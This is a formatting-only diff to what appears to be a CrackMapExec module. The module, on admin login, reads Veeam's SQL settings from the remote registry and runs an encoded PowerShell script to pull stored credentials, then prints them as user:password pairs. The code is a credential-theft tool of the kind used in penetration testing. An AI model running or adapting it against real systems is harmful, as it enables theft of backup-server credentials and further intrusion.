@@ -24,9 +24,7 @@ class CMEModule:
     multiple_hosts = True
 
     def __init__(self):
-        with open(
-            get_ps_script("veeam_dump_module/veeam-creds_dump.ps1"), "r"
-        ) as psFile:
+        with open(get_ps_script("veeam_dump_module/veeam-creds_dump.ps1"), "r") as psFile:
             self.psScript = psFile.read()
 
     def options(self, context, module_options):
@@ -55,15 +53,9 @@ class CMEModule:
             )
             keyHandle = ans["phkResult"]
 
-            SqlDatabase = rrp.hBaseRegQueryValue(
-                remoteOps._RemoteOperations__rrp, keyHandle, "SqlDatabaseName"
-            )[1].split("\x00")[:-1][0]
-            SqlInstance = rrp.hBaseRegQueryValue(
-                remoteOps._RemoteOperations__rrp, keyHandle, "SqlInstanceName"
-            )[1].split("\x00")[:-1][0]
-            SqlServer = rrp.hBaseRegQueryValue(
-                remoteOps._RemoteOperations__rrp, keyHandle, "SqlServerName"
-            )[1].split("\x00")[:-1][0]
+            SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlDatabaseName")[1].split("\x00")[:-1][0]
+            SqlInstance = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlInstanceName")[1].split("\x00")[:-1][0]
+            SqlServer = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlServerName")[1].split("\x00")[:-1][0]
 
         except DCERPCException as e:
             if str(e).find("ERROR_FILE_NOT_FOUND"):
@@ -84,23 +76,16 @@ class CMEModule:
         self.psScript = self.psScript.replace("REPLACE_ME_SqlServer", SqlServer)
         psScipt_b64 = b64encode(self.psScript.encode("UTF-16LE")).decode("utf-8")
 
-        output = connection.execute(
-            "powershell.exe -e {} -OutputFormat Text".format(psScipt_b64), True
-        )
+        output = connection.execute("powershell.exe -e {} -OutputFormat Text".format(psScipt_b64), True)
         # Format ouput if returned in some XML Format
         if "CLIXML" in output:
             output = self.stripXmlOutput(context, output)
 
         # Stripping whitespaces and newlines
-        output_stripped = [
-            " ".join(line.split()) for line in output.split("\r\n") if line.strip()
-        ]
+        output_stripped = [" ".join(line.split()) for line in output.split("\r\n") if line.strip()]
 
         # Error handling
-        if (
-            "Can't connect to DB! Exiting..." in output_stripped
-            or "No passwords found!" in output_stripped
-        ):
+        if "Can't connect to DB! Exiting..." in output_stripped or "No passwords found!" in output_stripped:
             context.log.fail(output_stripped[0])
             return
 
@@ -109,14 +94,8 @@ class CMEModule:
             context.log.highlight(user + ":" + password)
 
     def on_admin_login(self, context, connection):
-        SqlDatabase, SqlInstance, SqlServer = self.checkVeeamInstalled(
-            context, connection
-        )
+        SqlDatabase, SqlInstance, SqlServer = self.checkVeeamInstalled(context, connection)
 
         if SqlDatabase and SqlInstance and SqlServer:
-            context.log.success(
-                'Found Veeam DB "{}" on SQL Server "{}\\{}"! Extracting stored credentials...'.format(
-                    SqlDatabase, SqlServer, SqlInstance
-                )
-            )
+            context.log.success('Found Veeam DB "{}" on SQL Server "{}\\{}"! Extracting stored credentials...'.format(SqlDatabase, SqlServer, SqlInstance))
             self.extractCreds(context, connection, SqlDatabase, SqlInstance, SqlServer)
